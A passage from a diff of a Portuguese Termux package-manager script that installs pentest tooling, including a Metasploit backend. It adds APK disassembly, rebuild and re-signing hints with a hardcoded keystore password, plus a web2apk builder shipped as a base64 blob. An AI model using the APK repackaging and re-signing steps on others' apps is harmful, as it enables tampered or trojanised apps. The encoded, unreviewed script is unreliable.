+            _warn "  pkg install tur-repo && pkg install apkeditor"
+            return 1
+        fi
+    fi
 
-    command -v "$name" &>/dev/null || _die "$name foi compilado mas o comando não está disponível no PATH"
-    _ok "$name compilado e instalado em $BPFX/bin/$name (sem apt)"
+    if command -v apkeditor >/dev/null 2>&1; then
+        _ok "APKEditor disponível: $(apkeditor -version 2>/dev/null | head -1)"
+        printf "\n  Uso:\n"
+        printf "    apkeditor d -i app.apk            # desmonta\n"
+        printf "    apkeditor b -i pasta/ -o out.apk  # reconstrói\n"
+        printf "    apkeditor m -i app.xapk -o base.apk # extrai XAPK/APKS\n"
+        printf "    apkeditor x -i app.apk             # refatora nomes obfuscados\n"
+        printf "  Após rebuild, assine com:\n"
+        printf "    apksigner sign --ks ~/.xpm/tools/apktool/xpm-compat-test.keystore \\\n"
+        printf "      --ks-key-alias xpm-compat-test --ks-pass pass:xpm-compat-test out.apk\n"
+    fi
 }
 
-# ── Dispatcher de backend ─────────────────────────────────────────────────────
-_dispatch_install() {
-    local name="$1" origin="$2" repo="$3"
-    case "$origin" in
-        apt)    _backend_apt "$repo" ;;
-        pip)    _backend_pip "$repo" "$name" ;;
-        go)     _backend_go "$repo" ;;
-        cargo)  _backend_cargo "$repo" "$name" ;;
-        gem)    _backend_gem "$name" ;;
-        github) _backend_github "$repo" "$name" ;;
-        source) _backend_source "$repo" "$name" ;;
-        npm)    _backend_npm "$repo" ;;
-        msf)    _backend_msf ;;
-        apktool) _backend_apktool ;;
-        *)      _die "Backend desconhecido: $origin" ;;
-    esac
-}
+
+
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # LEITURA DO BANCO DE DADOS
@@ -95282,6 +95301,90 @@ _install_one() {
     _ok "$name instalado com sucesso!"
 }
 
+_dispatch_install() {
+    local name="$1" origin="$2" repo="$3"
+    case "$origin" in
+        apt)    pkg install -y "$repo" 2>/dev/null || _die "Falha ao instalar $repo via pkg" ;;
+        pip)    pip3 install --break-system-packages "$repo" 2>/dev/null \
+                || pip3 install "$repo" 2>/dev/null \
+                || _die "Falha ao instalar $repo via pip" ;;
+        go)     _backend_go "$repo" ;;
+        cargo)  cargo install "$repo" 2>/dev/null || _die "Falha ao instalar $repo via cargo" ;;
+        gem)    gem install "$repo" 2>/dev/null || _die "Falha ao instalar $repo via gem" ;;
+        npm)    _backend_npm "$repo" ;;
+        github) _backend_github "$name" "$repo" ;;
+        source) _backend_source "$repo" "$name" ;;
+        msf)    _backend_msf ;;
+        apktool)   _backend_apktool ;;
+        apkfull)   _backend_apkfull ;;
+        apkeditor) _backend_apkeditor ;;
+        web2apk)   _backend_web2apk ;;
+        *)      _die "Backend desconhecido: $origin" ;;
+    esac
+}
+
+
+
+_backend_web2apk() {
+  local PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
+  local W2A_HOME="$HOME/.xpm/web2apk"
+  local W2A_JAR="$W2A_HOME/android.jar"
+  local W2A_BIN="$PREFIX/bin/web2apk"
+
+  printf "\033[1;33m  -> Instalando deps (aapt2 ecj dx apksigner zipalign python)...\033[0m\n"
+  printf "\033[1;33m  -> Instalando deps uma por uma...\033[0m\n"
+  for _pkg in aapt2 ecj dx apksigner zipalign python; do
+    if ! command -v "$_pkg" >/dev/null 2>&1 && ! dpkg -l "$_pkg" >/dev/null 2>&1; then
+      printf "\033[0;90m     pkg install %s...\033[0m\n" "$_pkg"
+      pkg install -y "$_pkg" 2>/dev/null || printf "\033[1;33m     aviso: $_pkg nao instalado (pode nao estar disponivel)\033[0m\n"
+    fi
+  done
+
+  if [ ! -f "$W2A_JAR" ]; then
+    mkdir -p "$W2A_HOME"
+    printf "\033[1;33m  -> Baixando android.jar API 33 (~14MB, unica vez)...\033[0m\n"
+    python3 -c "
+import urllib.request, zipfile, io, os
+url='https://dl.google.com/android/repository/platform-33_r02.zip'
+out=os.path.expanduser('$HOME/.xpm/web2apk/android.jar')
+os.makedirs(os.path.dirname(out),exist_ok=True)
+print('  Conectando...',flush=True)
+with urllib.request.urlopen(url) as r:
+    total=int(r.headers.get('Content-Length',0)); data=bytearray(); done=0
+    while True:
+        buf=r.read(65536)
+        if not buf: break
+        data.extend(buf); done+=len(buf)
+        if total: print(f'\r  [{done*100//total:3d}%] {done/1048576:.1f}/{total/1048576:.1f}MB',end='',flush=True)
+    print()
+zf=zipfile.ZipFile(io.BytesIO(bytes(data)))
+jar_entry=next((n for n in zf.namelist() if n.endswith('android.jar')),None)
+if not jar_entry: print('ERRO: android.jar nao encontrado no zip. Entries:',zf.namelist()[:10]); sys.exit(1)
+with zf.open(jar_entry) as s,open(out,'wb') as d: d.write(s.read())
+print('  android.jar salvo (' + jar_entry + ')')
+" 2>&1 || { printf "\033[1;31m  Falha no download.\033[0m\n"; return 1; }
+  else
+    printf "\033[1;32m  android.jar ja presente\033[0m\n"
+  fi
+
+  printf "\033[1;33m  -> Instalando script web2apk...\033[0m\n"
+  python3 - "$W2A_BIN" << 'PYEOF'
+import sys, os, stat
+path = sys.argv[1]
+script_b64 = 'IyEvdXNyL2Jpbi9lbnYgYmFzaAojIHdlYjJhcGsgLS0gRWxsaW90T1MgSFRNTC9DU1MvSlMgLT4gQVBLClZFUlNJT049JzEuMC4wJwpQUkVGSVg9IiR7UFJFRklYOi0vZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyfSIKVzJBX0hPTUU9IiRIT01FLy54cG0vd2ViMmFwayIKVzJBX0pBUj0iJFcyQV9IT01FL2FuZHJvaWQuamFyIgpXMkFfS1M9IiRIT01FLy54cG0vdG9vbHMvYXBrdG9vbC94cG0tY29tcGF0LXRlc3Qua2V5c3RvcmUiClsgLWYgIiRXMkFfS1MiIF0gfHwgVzJBX0tTPSIkVzJBX0hPTUUvd2ViMmFway5rZXlzdG9yZSIKX29rKCkgICB7IHByaW50ZiAnXDAzM1sxOzMybSAgb2sgJXNcMDMzWzBtXG4nICAiJDEiOyB9Cl9pbmZvKCkgeyBwcmludGYgJ1wwMzNbMTszNm0gIC0+ICVzXDAzM1swbVxuJyAgIiQxIjsgfQpfd2FybigpIHsgcHJpbnRmICdcMDMzWzE7MzNtICAhICAlc1wwMzNbMG1cbicgICIkMSI7IH0KX2VycigpICB7IHByaW50ZiAnXDAzM1sxOzMxbSAgWCAgJXNcMDMzWzBtXG4nICIkMSIgPiYyOyBleGl0IDE7IH0KX2hlYWQoKSB7IHByaW50ZiAnXG5cMDMzWzE7MzVtICA9PSAlcyA9PVwwMzNbMG1cbicgIiQxIjsgfQpfZGltKCkgIHsgcHJpbnRmICdcMDMzWzA7OTBtICAlc1wwMzNbMG1cbicgIiQxIjsgfQpfcGVybV9yZXNvbHZlKCkgewogIGxvY2FsIHAKICBmb3IgcCBpbiAkKHByaW50ZiAnJXMnICIkMSIgfCB0ciAnLCcgJyAnKTsgZG8KICAgIGNhc2UgIiQocHJpbnRmICclcycgIiRwIiB8IHRyICdBLVonICdhLXonIHwgdHIgLWQgJyAnKSIgaW4KICAgICAgaW50ZXJuZXR8bmV0fG5ldHdvcmspICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5JTlRFUk5FVCcgOzsKICAgICAgY2FtZXJhfHdlYmNhbXxjYW0pICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5DQU1FUkEnIDs7CiAgICAgIG1pY3xtaWNyb3Bob25lfGF1ZGlvfHJlY29yZCkgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ09SRF9BVURJTycgOzsKICAgICAgc3RvcmFnZXxhcmNoaXZlc3xmaWxlc3xzZGNhcmQpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTUFOQUdFX0VYVEVSTkFMX1NUT1JBR0UnIDs7CiAgICAgIGxvY2F0aW9ufGdwc3xnZW8pCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkFDQ0VTU19GSU5FX0xPQ0FUSU9OJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5BQ0NFU1NfQ09BUlNFX0xPQ0FUSU9OJyA7OwogICAgICB2aWJyYXRlfHZpYnJhdGlvbikgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlZJQlJBVEUnIDs7CiAgICAgIGJsdWV0b290aHxidCkKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5CTFVFVE9PVEhfQ09OTkVDVCcKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIX1NDQU4nIDs7CiAgICAgIG5mYykgICAgICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTkZDJyA7OwogICAgICBjb250YWN0cykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUkVBRF9DT05UQUNUUycKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfQ09OVEFDVFMnIDs7CiAgICAgIHBob25lfGNhbGwpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkNBTExfUEhPTkUnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfUEhPTkVfU1RBVEUnIDs7CiAgICAgIHNtcykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uU0VORF9TTVMnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ0VJVkVfU01TJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5SRUFEX1NNUycgOzsKICAgICAgd2FrZXx3YWtlbG9jaykgICAgICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5XQUtFX0xPQ0snIDs7CiAgICAgIG5vdGlmaWNhdGlvbnN8bm90aWYpICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUE9TVF9OT1RJRklDQVRJT05TJyA7OwogICAgICBmbGFzaGxpZ2h0fHRvcmNoKSAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkZMQVNITElHSFQnIDs7CiAgICAgIHNlbnNvcnMpICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQk9EWV9TRU5TT1JTJyA7OwogICAgICAqKSAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiJHAiIDs7CiAgICBlc2FjCiAgZG9uZQp9Cl9nZW5faWNvbigpIHsKICBsb2NhbCBkc3Q9IiQxIiBzej0iJHsyOi0xOTJ9IgogIHB5dGhvbjMgLWMgIgppbXBvcnQgc3RydWN0LHpsaWIKZHN0LHN6PSckZHN0JyxpbnQoJyRzeicgaWYgJyRzeicgZWxzZSAnMTkyJykKcixnLGI9MjYsMTE1LDIzMgpkZWYgY2h1bmsobixkKToKIGM9emxpYi5jcmMzMihuK2QpJjB4ZmZmZmZmZmYKIHJldHVybiBzdHJ1Y3QucGFjaygnPkknLGxlbihkKSkrbitkK3N0cnVjdC5wYWNrKCc+SScsYykKcmF3PWInJwpmb3IgXyBpbiByYW5nZShzeik6IHJhdys9YidcXHgwMCcrYnl0ZXMoW3IsZyxiLDI1NV0qc3opCnBuZz1iJ1xceDg5UE5HXFxyXFxuXFx4MWFcXG4nK2NodW5rKGInSUhEUicsc3RydWN0LnBhY2soJz5JSUJCQkJCJyxzeixzeiw4LDYsMCwwLDApKStjaHVuayhiJ0lEQVQnLHpsaWIuY29tcHJlc3MocmF3LDYpKStjaHVuayhiJ0lFTkQnLGInJykKb3Blbihkc3QsJ3diJykud3JpdGUocG5nKQoiIDI+L2Rldi9udWxsCn0KX3Jlc2l6ZV9pY29uKCkgewogIGxvY2FsIHNyYz0iJDEiIGRzdD0iJDIiIHN6PSIkMyIKICBta2RpciAtcCAiJChkaXJuYW1lICIkZHN0IikiCiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsc2h1dGlsCnRyeToKIGZyb20gUElMIGltcG9ydCBJbWFnZQogSW1hZ2Uub3BlbignJHNyYycpLmNvbnZlcnQoJ1JHQkEnKS5yZXNpemUoKGludCgnJHN6JyksaW50KCckc3onKSksSW1hZ2UuTEFOQ1pPUykuc2F2ZSgnJGRzdCcpCmV4Y2VwdDogc2h1dGlsLmNvcHkoJyRzcmMnLCckZHN0JykKIiAyPi9kZXYvbnVsbCB8fCBjcCAiJHNyYyIgIiRkc3QiCn0KX2Vuc3VyZV9rZXlzdG9yZSgpIHsKICBbIC1mICIkVzJBX0tTIiBdICYmIHJldHVybgogIF9pbmZvICdHZXJhbmRvIGtleXN0b3JlLi4uJwogIG1rZGlyIC1wICIkKGRpcm5hbWUgIiRXMkFfS1MiKSIKICBrZXl0b29sIC1nZW5rZXlwYWlyIC12IC1rZXlzdG9yZSAiJFcyQV9LUyIgLWFsaWFzIHdlYjJhcGsgLWtleWFsZyBFQyAta2V5c2l6ZSAyNTYgLXZhbGlkaXR5IDEwMDAwIC1zdG9yZXBhc3Mgd2ViMmFway1rZXkgLWtleXBhc3Mgd2ViMmFway1rZXkgLWRuYW1lICdDTj13ZWIyYXBrLCBPPUVsbGlvdE9TLCBDPUJSJyAyPi9kZXYvbnVsbCAmJiBfb2sgJ0tleXN0b3JlIGNyaWFkYScKfQpfY21kX2NoZWNrKCkgewogIF9oZWFkICd3ZWIyYXBrIGNoZWNrJwogIGxvY2FsIG9rPTEKICBmb3IgY21kIGluIGFhcHQyIGVjaiBkeCBhcGtzaWduZXIgemlwYWxpZ24gcHl0aG9uMyBrZXl0b29sOyBkbwogICAgY29tbWFuZCAtdiAiJGNtZCIgPi9kZXYvbnVsbCAyPiYxICYmIF9vayAiJGNtZCIgfHwgeyBfd2FybiAiJGNtZCBuYW8gZW5jb250cmFkbyI7IG9rPTA7IH0KICBkb25lCiAgWyAtZiAiJFcyQV9KQVIiIF0gJiYgX29rICJhbmRyb2lkLmphciAtPiAkVzJBX0pBUiIgfHwgeyBfd2FybiAnYW5kcm9pZC5qYXIgYXVzZW50ZSAtLSB4cG0gaW5zdGFsbCB3ZWIyYXBrJzsgb2s9MDsgfQogIFsgIiRvayIgLWVxIDEgXSAmJiBwcmludGYgJ1xuXDAzM1sxOzMybSAgVHVkbyBwcm9udG8uXDAzM1swbVxuXG4nIHx8IHByaW50ZiAnXG5cMDMzWzE7MzNtICBJbnN0YWxlIG9zIGl0ZW5zIGFjaW1hLlwwMzNbMG1cblxuJwp9Cl9jbWRfaGVscCgpIHsKICBwcmludGYgJ1xuXDAzM1sxOzM1bSAgd2ViMmFwayAtLSBFbGxpb3RPUyBIVE1ML0NTUy9KUyAtPiBBUEtcMDMzWzBtXG5cbicKICBwcmludGYgJyAgXDAzM1sxOzMybVVzbzpcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgd2ViMmFwayBidWlsZCA8ZGlyPiBbb3Bjb2VzXVxuJwogIHByaW50ZiAnICAgIHdlYjJhcGsgYnVpbGQgLS11cmwgPGh0dHBzOi8vLi4uPiBbb3Bjb2VzXVxuJwogIHByaW50ZiAnICAgIHdlYjJhcGsgY2hlY2sgfCBoZWxwXG5cbicKICBwcmludGYgJyAgXDAzM1sxOzMybU9wY29lcyBkZSBidWlsZDpcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgLS1uYW1lIFwiTm9tZVwiICAgICAgICAgIE5vbWUgZXhpYmlkb1xuJwogIHByaW50ZiAnICAgIC0tcGtnbmFtZSBjb20ucGtnLmlkICAgUGFja2FnZSBJRFxuJwogIHByaW50ZiAnICAgIC0taWNvbiAvcGF0aC9pY29uLnBuZyAgSWNvbmUgUE5HIGxhdW5jaGVyXG4nCiAgcHJpbnRmICcgICAgLS1vdXQgL3BhdGgvYXBwLmFwayAgICBTYWlkYVxuJwogIHByaW50ZiAnICAgIC0tcGVybSBjYW0sbWljLC4uLiAgICAgUGVybWlzc29lcyBwb3IgdmlyZ3VsYVxuJwogIHByaW50ZiAnICAgIC0tdmVyc2lvbiBcIjEuMFwiICAgICAgICBWZXJzaW9uIG5hbWVcbicKICBwcmludGYgJyAgICAtLXZlcnNpb25jb2RlIE4gICAgICAgIFZlcnNpb24gY29kZVxuJwogIHByaW50ZiAnICAgIC0tbWluLXNkayBOICAgICAgICAgICAgTWluIFNESyAocGFkcmFvIDIxKVxuJwogIHByaW50ZiAnICAgIC0tdGFyZ2V0LXNkayBOICAgICAgICAgVGFyZ2V0IFNESyAocGFkcmFvIDMzKVxuJwogIHByaW50ZiAnICAgIC0tb3JpZW50YXRpb24gcG9ydHJhaXR8bGFuZHNjYXBlfGF1dG9cbicKICBwcmludGYgJyAgICAtLWZ1bGxzY3JlZW4gICAgICAgICAgIEVzY29uZGUgc3RhdHVzIGJhclxuJwogIHByaW50ZiAnICAgIC0tdGhlbWUgZGFya3xsaWdodHx0cmFuc3BhcmVudFxuJwogIHByaW50ZiAnICAgIC0tdXJsIGh0dHBzOi8vLi4uICAgICAgQ2FycmVnYSBVUkwgcmVtb3RhXG4nCiAgcHJpbnRmICcgICAgLS1uby1pbnRlcm5ldCAgICAgICAgICBTZW0gSU5URVJORVQgYXV0b21hdGljYVxuXG4nCiAgcHJpbnRmICcgIFwwMzNbMTszMm1QZXJtaXNzb2VzOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtaW50ZXJuZXQgY2FtZXJhIG1pYyBzdG9yYWdlIGxvY2F0aW9uIHZpYnJhdGUgYmx1ZXRvb3RoIG5mYyBjb250YWN0cyBwaG9uZSBzbXMgd2FrZSBub3RpZmljYXRpb25zIGZsYXNobGlnaHQgc2Vuc29yc1wwMzNbMG1cblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtdGVtcGxhdGU6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG13ZWIyYXBrIHRlbXBsYXRlICAgICAgICAgICAg4oCUIG1lbnUgaW50ZXJhdGl2byBkZSB0ZW1wbGF0ZXNcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgdGVtcGxhdGUgYmFzaWMgICAgICDigJQgZ2VyYSBiYXNpY2FwcC8gY29tIEhUTUwrQ1NTK0pTXDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG13ZWIyYXBrIHRlbXBsYXRlIGdhbWUgICAgICAg4oCUIGdlcmEgZ2FtZWFwcC8gY29tIGpvZ28gU25ha2VcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgdGVtcGxhdGUgcHdhICAgICAgICDigJQgZ2VyYSBwd2FhcHAvIGNvbSBQV0Egb2ZmbGluZVwwMzNbMG1cblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtTWFudWFsIGRlIGFycXVpdm9zOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtd2ViMmFwayAtLW1hbiAg4oCUIGV4cGxpY2EgbyBxdWUgY2FkYSBhcnF1aXZvIChIVE1ML0NTUy9KUykgZGV2ZSBjb250ZXJcMDMzWzBtXG5cbicKICBwcmludGYgJyAgXDAzM1sxOzMybUV4ZW1wbG9zOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtd2ViMmFwayBidWlsZCAuL21ldWFwcC9cMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgYnVpbGQgLi9hcHAvIC0tbmFtZSBcIlZQTi1YXCIgLS1wa2duYW1lIGNvbS5teXZwbnggLS1wZXJtIGludGVybmV0LGNhbWVyYSAtLWZ1bGxzY3JlZW5cMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgYnVpbGQgLS11cmwgaHR0cHM6Ly9leGVtcGxvLmNvbSAtLW5hbWUgXCJNZXUgU2l0ZVwiXDAzM1swbVxuXG4nCn0KX2NtZF9idWlsZCgpIHsKICBsb2NhbCBTUkNfRElSPScnIExPQURfVVJMPScnIEFQUF9OQU1FPScnIFBLR19OQU1FPScnIElDT05fU1JDPScnCiAgbG9jYWwgT1VUX0FQSz0nJyBQRVJNUz0nJyBWRVJTSU9OX05BTUU9JzEuMC4wJyBWRVJTSU9OX0NPREU9MQogIGxvY2FsIE1JTl9TREs9MjEgVEFSR0VUX1NESz0zMyBPUklFTlRBVElPTj0ndW5zcGVjaWZpZWQnCiAgbG9jYWwgRlVMTFNDUkVFTj0wIFRIRU1FPSdsaWdodCcgTk9fSU5URVJORVQ9MAoKICB3aGlsZSBbICQjIC1ndCAwIF07IGRvCiAgICBjYXNlICIkMSIgaW4KICAgICAgLS11cmwpICAgICAgICAgIExPQURfVVJMPSIkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLW5hbWUpICAgICAgICAgQVBQX05BTUU9IiQyIjsgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tcGtnbmFtZSkgICAgICBQS0dfTkFNRT0iJDIiOyAgICAgIHNoaWZ0IDIgOzsKICAgICAgLS1pY29uKSAgICAgICAgIElDT05fU1JDPSIkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLW91dCkgICAgICAgICAgT1VUX0FQSz0iJDIiOyAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tcGVybXwtLXBlcm1zKSBQRVJNUz0iJFBFUk1TLCQyIjsgc2hpZnQgMiA7OwogICAgICAtLXZlcnNpb24pICAgICAgVkVSU0lPTl9OQU1FPSIkMiI7ICBzaGlmdCAyIDs7CiAgICAgIC0tdmVyc2lvbmNvZGUpICBWRVJTSU9OX0NPREU9IiQyIjsgIHNoaWZ0IDIgOzsKICAgICAgLS1taW4tc2RrKSAgICAgIE1JTl9TREs9IiQyIjsgICAgICAgc2hpZnQgMiA7OwogICAgICAtLXRhcmdldC1zZGspICAgVEFSR0VUX1NESz0iJDIiOyAgICBzaGlmdCAyIDs7CiAgICAgIC0tb3JpZW50YXRpb24pICBPUklFTlRBVElPTj0iJDIiOyAgIHNoaWZ0IDIgOzsKICAgICAgLS1mdWxsc2NyZWVuKSAgIEZVTExTQ1JFRU49MTsgICAgICAgc2hpZnQgOzsKICAgICAgLS10aGVtZSkgICAgICAgIFRIRU1FPSIkMiI7ICAgICAgICAgc2hpZnQgMiA7OwogICAgICAtLW5vLWludGVybmV0KSAgTk9fSU5URVJORVQ9MTsgICAgICBzaGlmdCA7OwogICAgICAtLSopICAgICAgICAgICAgX3dhcm4gIk9wY2FvIGRlc2NvbmhlY2lkYTogJDEiOyBzaGlmdCA7OwogICAgICAqKSBbIC16ICIkU1JDX0RJUiIgXSAmJiBbIC16ICIkTE9BRF9VUkwiIF0gJiYgU1JDX0RJUj0iJDEiOyBzaGlmdCA7OwogICAgZXNhYwogIGRvbmUKCiAgWyAtZiAiJFcyQV9KQVIiIF0gfHwgX2VyciAnYW5kcm9pZC5qYXIgYXVzZW50ZS4gRXhlY3V0ZTogeHBtIGluc3RhbGwgd2ViMmFwaycKICBpZiBbIC16ICIkTE9BRF9VUkwiIF07IHRoZW4KICAgIFsgLXogIiRTUkNfRElSIiBdICYmIHsgX2NtZF9oZWxwOyBleGl0IDE7IH0KICAgIFsgLWQgIiRTUkNfRElSIiBdIHx8IF9lcnIgIkRpcmV0b3JpbyBuYW8gZW5jb250cmFkbzogJFNSQ19ESVIiCiAgICBbIC1mICIkU1JDX0RJUi9pbmRleC5odG1sIiBdIHx8IF93YXJuICdpbmRleC5odG1sIG5hbyBlbmNvbnRyYWRvJwogIGZpCgogIGxvY2FsIERJUl9CQVNFOyBESVJfQkFTRT0kKGJhc2VuYW1lICIke1NSQ19ESVIlL30iKQogIFsgLXogIiRBUFBfTkFNRSIgXSAmJiBBUFBfTkFNRT0iJHtESVJfQkFTRTotV2ViQXBwfSIKICBsb2NhbCBQS0dfU0FGRTsgUEtHX1NBRkU9JChwcmludGYgJyVzJyAiJEFQUF9OQU1FIiB8IHRyICdBLVonICdhLXonIHwgc2VkICdzL1teYS16MC05XS9fL2c7cy9fXyovXy9nJykKICBbIC16ICIkUEtHX05BTUUiIF0gJiYgUEtHX05BTUU9ImNvbS5lbGxpb3Rvcy53ZWJhcGsuJHtQS0dfU0FGRX0iCiAgWyAteiAiJE9VVF9BUEsiICBdICYmIE9VVF9BUEs9IiR7QVBQX05BTUUvLyAvX30uYXBrIgogIFsgIiROT19JTlRFUk5FVCIgLWVxIDAgXSAmJiBQRVJNUz0iaW50ZXJuZXQsJFBFUk1TIgoKICBfaGVhZCAnd2ViMmFwayBidWlsZCcKICBfaW5mbyAiQXBwICAgICA6ICRBUFBfTkFNRSIKICBfaW5mbyAiUGFja2FnZSA6ICRQS0dfTkFNRSIKICBfaW5mbyAiU2FpZGEgICA6ICRPVVRfQVBLIgogIFsgLW4gIiRMT0FEX1VSTCIgXSAmJiBfaW5mbyAiVVJMICAgICA6ICRMT0FEX1VSTCIKICBbIC1uICIkU1JDX0RJUiIgIF0gJiYgX2luZm8gIkZvbnRlICAgOiAkU1JDX0RJUiIKCiAgbG9jYWwgQlVJTEQKICBCVUlMRD0kKG1rdGVtcCAtZCAvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL3RtcC93ZWIyYXBrLlhYWFhYWCAyPi9kZXYvbnVsbCkgXAogICAgfHwgQlVJTEQ9JChta3RlbXAgLWQgIiRIT01FLy54cG0vd2ViMmFway9idWlsZC5YWFhYWFgiKQogIHRyYXAgJ3JtIC1yZiAiJEJVSUxEIicgRVhJVAoKICBsb2NhbCBQS0dfUEFUSDsgUEtHX1BBVEg9JChwcmludGYgJyVzJyAiJFBLR19OQU1FIiB8IHRyICcuJyAnLycpCiAgbWtkaXIgLXAgIiRCVUlMRC9zcmMvJFBLR19QQVRIIiAiJEJVSUxEL2NsYXNzZXMiICIkQlVJTEQvcmVzX2NvbXBpbGVkIiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvdmFsdWVzIiAiJEJVSUxEL3Jlcy94bWwiICIkQlVJTEQvYXNzZXRzL3d3dyIgXAogICAgICAgICAgICIkQlVJTEQvcmVzL2RyYXdhYmxlLW1kcGkiICAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpIiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvZHJhd2FibGUteGhkcGkiICIkQlVJTEQvcmVzL2RyYXdhYmxlLXh4aGRwaSIgXAogICAgICAgICAgICIkQlVJTEQvcmVzL2RyYXdhYmxlLXh4eGhkcGkiCgogICMg4pSA4pSAIMONY29uZSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBfaW5mbyAnUHJlcGFyYW5kbyBpY29uZS4uLicKICBpZiBbIC1uICIkSUNPTl9TUkMiIF0gJiYgWyAtZiAiJElDT05fU1JDIiBdOyB0aGVuCiAgICBfcmVzaXplX2ljb24gIiRJQ09OX1NSQyIgIiRCVUlMRC9yZXMvZHJhd2FibGUtbWRwaS9pY29uLnBuZyIgICAgNDgKICAgIF9yZXNpemVfaWNvbiAiJElDT05fU1JDIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpL2ljb24ucG5nIiAgICA3MgogICAgX3Jlc2l6ZV9pY29uICIkSUNPTl9TUkMiICIkQlVJTEQvcmVzL2RyYXdhYmxlLXhoZHBpL2ljb24ucG5nIiAgIDk2CiAgICBfcmVzaXplX2ljb24gIiRJQ09OX1NSQyIgIiRCVUlMRC9yZXMvZHJhd2FibGUteHhoZHBpL2ljb24ucG5nIiAgMTQ0CiAgICBfcmVzaXplX2ljb24gIiRJQ09OX1NSQyIgIiRCVUlMRC9yZXMvZHJhd2FibGUteHh4aGRwaS9pY29uLnBuZyIgMTkyCiAgZWxzZQogICAgWyAtbiAiJElDT05fU1JDIiBdICYmIF93YXJuICJJY29uZSBuYW8gZW5jb250cmFkbzogJElDT05fU1JDIC0tIHVzYW5kbyBnZXJhZG8iCiAgICBfZ2VuX2ljb24gIiRCVUlMRC9yZXMvZHJhd2FibGUtbWRwaS9pY29uLnBuZyIgICAgNDgKICAgIF9nZW5faWNvbiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpL2ljb24ucG5nIiAgICA3MgogICAgX2dlbl9pY29uICIkQlVJTEQvcmVzL2RyYXdhYmxlLXhoZHBpL2ljb24ucG5nIiAgIDk2CiAgICBfZ2VuX2ljb24gIiRCVUlMRC9yZXMvZHJhd2FibGUteHhoZHBpL2ljb24ucG5nIiAgMTQ0CiAgICBfZ2VuX2ljb24gIiRCVUlMRC9yZXMvZHJhd2FibGUteHh4aGRwaS9pY29uLnBuZyIgMTkyCiAgZmkKCiAgIyDilIDilIAgQXNzZXRzIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgO